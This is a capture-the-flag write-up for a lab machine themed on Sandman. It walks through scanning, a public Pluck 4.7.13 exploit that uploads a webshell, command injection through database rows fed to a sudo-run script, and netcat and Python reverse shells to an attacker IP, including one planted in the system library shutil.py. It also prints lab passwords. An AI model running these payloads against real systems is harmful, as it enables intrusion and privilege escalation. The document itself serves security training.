## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
While the king of dreams was imprisoned, his home fell into ruins.
Can you help Sandman restore his kingdom?
```

## IP-Address
```IP-Address
10.10.14.250
```

## RustScan
```bash
$ rustscan -a 10.10.14.250 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60s
```

## Gobuster 
```bash
$ gobuster dir -u http://10.10.147.98/  -w /usr/share/seclists/Discovery/Web-Content/common.txt -t4  -x php,txt,bak
/.hta                 (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.hta.bak             (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.bak        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.bak        (Status: 403) [Size: 278]
/app                  (Status: 301) [Size: 312] [--> http://10.10.14.250/app/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]
```

Navigate to `http://10.10.14.250/app/` 
We Found a Folder which is `pluck-4.7.13` and when open we redirect to 
`http://10.10.14.250/app/pluck-4.7.13/?file=dreaming`
which gives us file traversal opportunity
so we tried this many things but nothing works then we tried burp and found that admin password is password 
so we login in but nothing found interesting then we search on exploitdb.com for exploit and found one 
```exploiot_link
https://www.exploit-db.com/exploits/49909
```
after downloading it we run it as 
```bash
$ python3 49909.py 10.10.14.250 80 password /app/pluck-4.7.13
```
then we got msg
```bash
Authentification was succesfull, uploading webshell

^[Uploaded Webshell to: http://10.10.14.250:80/app/pluck-4.7.13/files/shell.phar

```
And Got shell at `http://10.10.14.250:80/app/pluck-4.7.13/files/shell.phar`
but then we used revshell to transfer the shell on terminal on web interface
then after searching for files so may times I found 
```bash
$cd /opt

p0wny@shell:/opt# cat test.py
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "[password omitted]"

data = {
        "cont1":password,
        "bogus":"",
        "submit":"Log+in"
        }

req = requests.post(url,data=data)

if "Password correct." in req.text:
    print("Everything is in proper order. Status Code: " + str(req.status_code))
else:
    print("Something is wrong. Status Code: " + str(req.status_code))
    print("Results:\n" + req.text)
```
Got the SSh Credentials 
```bash
$ ssh lucien@10.10.14.250
pasword = HeyLucien#@1999!
```
Got the lucien flag 
```bash
$ cat /home/lucien/lucien_flag.txt 
[flag omitted]
```

Flag
```flag
[flag omitted]
```

Also Got a file at /opt
```bash
$ cat getDreams.py 
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=[password omitted]
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()
```

then I realize I can Found something in the lucien directory 
```bash
lucien@ip-10-10-14-250:~$ cat .bash_history 
ls
cd /etc/ssh/
clear
nano sshd_config
su root
cd ..
ls
cd ..
cd etc
ls
..
cd ..
cd usr
cd lib
cd python3.8
nano shutil.py 
clear
clear
su root
cd ~~
cd ~
clear
ls
mysql -u lucien -plucien42DBPASSWORD

```

Got the MYSQL Credentials
```credentials
mysql -u lucien -plucien42DBPASSWORD
```
and then 
```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| library            |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use library;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_library |
+-------------------+
| dreams            |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
```
After that we got idea to inject an malicious line inside the dreams which will execute as death
```bash
mysql> insert into dreams (dreamer, dream) VALUES ("'flag'", "''; cat ~/death_flag.txt; # ");
mysql> select * from dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
| 'flag'  | ''; cat ~/death_flag.txt; #        |
+---------+------------------------------------+
5 rows in set (0.00 sec)
```
Then we again execute the getDreams.py
```bash
$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

flag + 
[flag omitted]
```

Got the Second Flag
```flag
[flag omitted]
```

Now for the third Flag lets first get the death credentials via Reverseshell
using mysql
```bash
mysql> use library;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> insert into dreams (dreamer, dream) VALUES ("'flag'", "''; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.36.74 4444 >/tmp/f); # ");
Query OK, 1 row affected (0.02 sec)
```

And Run 
```bash
lucien@ip-10-10-190-109:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky
Bob + Exploring ancient ruins
Carol + Becoming a successful entrepreneur
Dave + Becoming a professional musician
rm: cannot remove '/tmp/f': No such file or directory
```
and Got the Reverseshell
```bash
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.36.74] from (UNKNOWN) [10.10.190.109] 53808
$ whoami
death
$ cat getDreams.py
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "!mementoMORI666!"
DB_NAME = "library"
```
Got death Credentails
```credentials
death  :  !mementoMORI666!
```

SSH Login
```bash
death@ip-10-10-190-109:/home/morpheus$ ls
kingdom  morpheus_flag.txt  restore.py
death@ip-10-10-190-109:/home/morpheus$ cat morpheus_flag.txt 
cat: morpheus_flag.txt: Permission denied
death@ip-10-10-190-109:/home/morpheus$ cat restore.py 
from shutil import copy2 as backup
src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"
backup(src_file, dst_file)
print("The kingdom backup has been done!")
death@ip-10-10-190-109:/home/morpheus$ cat kingdom 
We saved the kingdom!
```
Lets find out the editable file by the user
```bash
$ find /home/ -type f -writable 2>/dev/null 
/usr/lib/python3.8/shutil.py
```

And the Edit this file 
```bash
nano /usr/lib/python3.8/shutil.py
```
And Add this on top of the file 
```nano 
import os
import socket
import subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.17.36.74",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```
and Save this file and wait for root to trigger the python3 if not trigger own its own then 
Execute 
```bash
grep -rl 'import shutil' /etc /usr /root 2>/dev/null
```

And Got the Reverse-shell
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.36.74] from (UNKNOWN) [10.10.190.109] 46204
/bin/sh: 0: can't access tty; job control turned off
$ whoami 
morpheus
$ ls
kingdom
morpheus_flag.txt
restore.py
$ cat morpheus_flag.txt
[flag omitted]
```

Got the flag
```flag
[flag omitted]
```